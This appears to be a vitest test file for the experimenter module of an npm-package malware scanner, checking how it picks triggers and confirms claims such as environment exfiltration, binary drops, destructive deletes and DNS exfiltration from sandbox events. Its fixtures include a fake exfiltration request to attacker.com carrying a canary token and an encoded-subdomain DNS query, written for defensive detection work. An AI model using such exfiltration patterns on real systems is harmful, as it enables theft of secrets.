import { describe, it, expect } from "vitest";
import type { Hypothesis, RunArtifact, Event } from "@npmguard/shared";
import {
  strategyForClaim,
  pickTriggerTarget,
  eventsContainDnsWithPayload,
} from "./experimenter.js";

function hyp(overrides: Partial<Hypothesis> = {}): Hypothesis {
  return {
    hypId: "h1",
    description: "test",
    claim: { kind: "env_exfil", gating: null },
    focusFiles: ["setup.js"],
    focusLines: [{ file: "setup.js", range: "1-10" }],
    severity: "high",
    parentHypId: null,
    childHypIds: [],
    state: "OPEN",
    createdBy: "triage",
    evidenceRefs: [],
    createdAt: "2026-04-24T12:00:00.000Z",
    resolvedAt: null,
    resolution: null,
    ...overrides,
  };
}

function baseArtifact(overrides: Partial<RunArtifact> = {}): RunArtifact {
  return {
    runId: "run_test",
    triggerUsed: { kind: "entrypoint", target: "index.js", argv: [], stdin: null },
    setupApplied: {
      env: {},
      date: null,
      plantFiles: [],
      stubUrls: [],
      hostname: null,
      locale: null,
      patches: [],
      preloadHash: null,
    },
    observe: { kernel: false, network: false, fsDiff: false, node: true, inspector: false },
    budget: { wallMs: 15000, maxSyscalls: null, maxBytesCapture: null },
    wallMs: 500,
    exitCode: 0,
    timedOut: false,
    events: overrides.events ?? [],
    stdoutHash: null,
    stderrHash: null,
    fsDiffHash: null,
    pcapHash: null,
    straceLogHash: null,
    inspectorLogHash: null,
    eventSummary: { uniqueHosts: [], uniqueSyscalls: [], filesWritten: [], dnsQueries: [] },
    error: null,
    contentHash: "abc",
    createdAt: "2026-04-24T12:00:00.000Z",
    ...overrides,
  };
}

function makeEvent(overrides: Partial<Event> = {}): Event {
  return {
    stream: overrides.stream ?? "L4:monkey",
    timestamp: overrides.timestamp ?? 1000,
    pid: overrides.pid ?? 1,
    kind: overrides.kind ?? "network",
    raw: overrides.raw ?? null,
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// strategyForClaim
// ---------------------------------------------------------------------------

describe("pickTriggerTarget", () => {
  it("prefers a focusFile that is an install entry point", () => {
    const h = hyp({ focusFiles: ["setup.js", "index.js"] });
    const result = pickTriggerTarget(h, "index.js", ["setup.js"]);
    expect(result.target).toBe("setup.js");
  });

  it("falls back to runtimeEntry when no focusFile is an install entry", () => {
    const h = hyp({ focusFiles: ["lib/util.js"] });
    const result = pickTriggerTarget(h, "index.js", ["setup.js"]);
    expect(result.target).toBe("index.js");
  });

  it("falls back to runtimeEntry when installEntries is empty", () => {
    const h = hyp({ focusFiles: ["setup.js"] });
    const result = pickTriggerTarget(h, "index.js", []);
    expect(result.target).toBe("index.js");
  });
});

describe("strategyForClaim", () => {
  it("returns a strategy for env_exfil targeting lifecycle file when available", () => {
    const h = hyp({ focusFiles: ["setup.js"] });
    const s = strategyForClaim("env_exfil", h, "index.js", ["setup.js"]);
    expect(s).not.toBeNull();
    expect(s!.trigger.target).toBe("setup.js");
    expect(s!.setup.length).toBeGreaterThan(0);
  });

  it("returns a strategy for binary_drop", () => {
    const s = strategyForClaim("binary_drop", hyp({ claim: { kind: "binary_drop", gating: null } }), "index.js");
    expect(s).not.toBeNull();
    expect(s!.observe?.fsDiff).toBe(true);
    expect(s!.observe?.kernel).toBe(true);
  });

  it("returns a strategy for dos_loop with tight budget", () => {
    const s = strategyForClaim("dos_loop", hyp({ claim: { kind: "dos_loop", gating: null } }), "index.js");
    expect(s).not.toBeNull();
    expect(s!.budget?.wallMs).toBe(5000);
  });

  it("returns a strategy for telemetry", () => {
    const s = strategyForClaim("telemetry", hyp({ claim: { kind: "telemetry", gating: null } }), "index.js");
    expect(s).not.toBeNull();
    expect(s!.trigger.kind).toBe("subpath");
    expect(s!.observe?.network).toBe(true);
    expect(s!.setup.length).toBeGreaterThan(1);
  });

  it("returns a strategy for build_plugin_exfil", () => {
    const s = strategyForClaim("build_plugin_exfil", hyp({ claim: { kind: "build_plugin_exfil", gating: null } }), "index.js");
    expect(s).not.toBeNull();
    expect(s!.trigger.kind).toBe("subpath");
    expect(s!.setup.length).toBeGreaterThan(0);
  });

  it("returns a strategy for destructive with fs diff enabled", () => {
    const s = strategyForClaim("destructive", hyp({ claim: { kind: "destructive", gating: null } }), "index.js");
    expect(s).not.toBeNull();
    expect(s!.observe?.fsDiff).toBe(true);
    expect(s!.setup.length).toBeGreaterThan(1);
  });

  it("still returns null for browser-only strategies", () => {
    expect(strategyForClaim("dom_inject", hyp({ claim: { kind: "dom_inject", gating: null } }), "x")).toBeNull();
    expect(strategyForClaim("clipboard_hijack", hyp({ claim: { kind: "clipboard_hijack", gating: null } }), "x")).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// Confirmation checks via strategy.confirm()
// ---------------------------------------------------------------------------

describe("env_exfil confirmation", () => {
  const strategy = strategyForClaim("env_exfil", hyp(), "index.js")!;

  it("confirms when canary token appears in network traffic", () => {
    const art = baseArtifact({
      events: [
        makeEvent({
          stream: "L4:monkey",
          kind: "network",
          raw: `POST http://attacker.com/steal?t=NPMGUARD_CANARY_TOKEN_f8e2d91a`,
        }),
      ],
    });
    expect(strategy.confirm(art).confirmed).toBe(true);
  });

  it("confirms when any network activity is detected (conservative)", () => {
    const art = baseArtifact({
      events: [makeEvent({ kind: "connect", stream: "L1:seccomp" })],
    });
    expect(strategy.confirm(art).confirmed).toBe(true);
  });

  it("does not confirm when no network events", () => {
    const art = baseArtifact({
      events: [makeEvent({ kind: "fs_op", stream: "L4:monkey" })],
    });
    expect(strategy.confirm(art).confirmed).toBe(false);
  });
});

describe("dos_loop confirmation", () => {
  const strategy = strategyForClaim("dos_loop", hyp({ claim: { kind: "dos_loop", gating: null } }), "index.js")!;

  it("confirms on timeout", () => {
    const art = baseArtifact({ timedOut: true });
    expect(strategy.confirm(art).confirmed).toBe(true);
  });

  it("does not confirm when process exits cleanly", () => {
    const art = baseArtifact({ timedOut: false, exitCode: 0 });
    expect(strategy.confirm(art).confirmed).toBe(false);
  });
});

describe("binary_drop confirmation", () => {
  const strategy = strategyForClaim("binary_drop", hyp({ claim: { kind: "binary_drop", gating: null } }), "index.js")!;

  it("confirms when execve + network", () => {
    const art = baseArtifact({
      events: [
        makeEvent({ kind: "execve", stream: "L1:seccomp" }),
        makeEvent({ kind: "connect", stream: "L1:seccomp" }),
      ],
    });
    const check = strategy.confirm(art);
    expect(check.confirmed).toBe(true);
    expect(check.reason).toContain("network");
  });

  it("confirms on execve alone", () => {
    const art = baseArtifact({
      events: [makeEvent({ kind: "execve", stream: "L1:seccomp" })],
    });
    expect(strategy.confirm(art).confirmed).toBe(true);
  });

  it("does not confirm without execve", () => {
    const art = baseArtifact({ events: [] });
    expect(strategy.confirm(art).confirmed).toBe(false);
  });
});

describe("obfuscation confirmation", () => {
  const strategy = strategyForClaim("obfuscation", hyp({ claim: { kind: "obfuscation", gating: null } }), "index.js")!;

  it("confirms on eval events", () => {
    const art = baseArtifact({
      events: [makeEvent({ kind: "eval", stream: "L4:monkey" })],
    });
    expect(strategy.confirm(art).confirmed).toBe(true);
  });

  it("confirms on script_parsed (V8 inspector)", () => {
    const art = baseArtifact({
      events: [makeEvent({ kind: "script_parsed", stream: "L4:v8inspector" })],
    });
    expect(strategy.confirm(art).confirmed).toBe(true);
  });

  it("does not confirm without eval/script_parsed", () => {
    const art = baseArtifact({ events: [] });
    expect(strategy.confirm(art).confirmed).toBe(false);
  });
});

describe("telemetry/build-plugin confirmation", () => {
  const telemetry = strategyForClaim("telemetry", hyp({ claim: { kind: "telemetry", gating: null } }), "index.js")!;
  const buildPlugin = strategyForClaim("build_plugin_exfil", hyp({ claim: { kind: "build_plugin_exfil", gating: null } }), "index.js")!;

  it("confirms telemetry when canary appears in outbound data", () => {
    const art = baseArtifact({
      events: [
        makeEvent({
          kind: "network",
          stream: "L4:monkey",
          raw: "POST /metrics NPMGUARD_CANARY_TOKEN_f8e2d91a",
        }),
      ],
    });
    expect(telemetry.confirm(art).confirmed).toBe(true);
  });

  it("confirms build-plugin exfil on outbound network activity", () => {
    const art = baseArtifact({
      events: [makeEvent({ kind: "connect", stream: "L1:seccomp" })],
    });
    expect(buildPlugin.confirm(art).confirmed).toBe(true);
  });
});

describe("destructive confirmation", () => {
  const strategy = strategyForClaim("destructive", hyp({ claim: { kind: "destructive", gating: null } }), "index.js")!;

  it("confirms on file deletion", () => {
    const art = baseArtifact({
      events: [makeEvent({ kind: "file_deleted", stream: "L3:fsDiff" })],
    });
    expect(strategy.confirm(art).confirmed).toBe(true);
  });

  it("confirms on unlink syscall", () => {
    const art = baseArtifact({
      events: [makeEvent({ kind: "unlink", stream: "L1:seccomp" })],
    });
    expect(strategy.confirm(art).confirmed).toBe(true);
  });

  it("does not confirm on harmless fs writes", () => {
    const art = baseArtifact({
      events: [makeEvent({ kind: "file_created", stream: "L3:fsDiff" })],
    });
    expect(strategy.confirm(art).confirmed).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// DNS exfil helper
// ---------------------------------------------------------------------------

describe("eventsContainDnsWithPayload", () => {
  it("detects long subdomain labels (encoded data)", () => {
    const events = [
      makeEvent({
        kind: "dns_query",
        stream: "L2:pcap",
        raw: "aabbccddeeaabbccddeeaabbccddee.attacker.com",
      }),
    ];
    expect(eventsContainDnsWithPayload(events)).toBe(true);
  });

  it("does not flag normal DNS queries", () => {
    const events = [
      makeEvent({ kind: "dns_query", stream: "L2:pcap", raw: "example.com" }),
    ];
    expect(eventsContainDnsWithPayload(events)).toBe(false);
  });
});
